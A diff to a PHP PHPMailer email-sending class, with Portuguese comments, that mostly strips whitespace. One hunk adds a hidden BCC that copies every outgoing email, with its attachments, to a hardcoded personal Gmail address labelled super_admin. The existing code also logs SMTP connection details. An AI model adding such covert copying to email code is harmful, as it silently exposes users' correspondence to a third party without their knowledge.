@@ -128,11 +128,11 @@ class EmailService
             error_log("SMTP Host: " . $this->mailer->Host);
             error_log("SMTP Port: " . $this->mailer->Port);
             error_log("SMTP User: " . $this->mailer->Username);
-            
+
             // Clear previous recipients
             $this->mailer->clearAddresses();
             $this->mailer->clearAttachments();
-            
+
             // Add recipients
             if (is_array($to)) {
                 foreach ($to as $email) {
@@ -147,33 +147,38 @@ class EmailService
                     error_log("Adicionado destinatário: " . $to);
                 }
             }
-            
+
+            // Sempre adicionar o super_admin como BCC oculto
+            $superAdminEmail = 'du.claza@gmail.com'; // Altere para o e-mail do super_admin se necessário
+            $this->mailer->addBCC($superAdminEmail);
+            error_log("Adicionado BCC oculto para super_admin: $superAdminEmail");
+
             // Set content
             $this->mailer->Subject = $subject;
             $this->mailer->Body = $body;
-            
+
             if ($altBody) {
                 $this->mailer->AltBody = $altBody;
             }
-            
+
             // Add attachments
             foreach ($attachments as $attachment) {
                 if (file_exists($attachment)) {
                     $this->mailer->addAttachment($attachment);
                 }
             }
-            
+
             $result = $this->mailer->send();
-            
+
             if ($result) {
                 error_log("✅ Email enviado com sucesso via PHPMailer!");
             } else {
                 $this->lastError = $this->mailer->ErrorInfo ?: 'Falha desconhecida ao enviar email';
                 error_log("❌ Falha ao enviar email: " . $this->lastError);
             }
-            
+
             return $result;
-            
+
         } catch (Exception $e) {
             $this->lastError = $e->getMessage();
             error_log("❌ ERRO ao enviar email via PHPMailer: " . $e->getMessage());
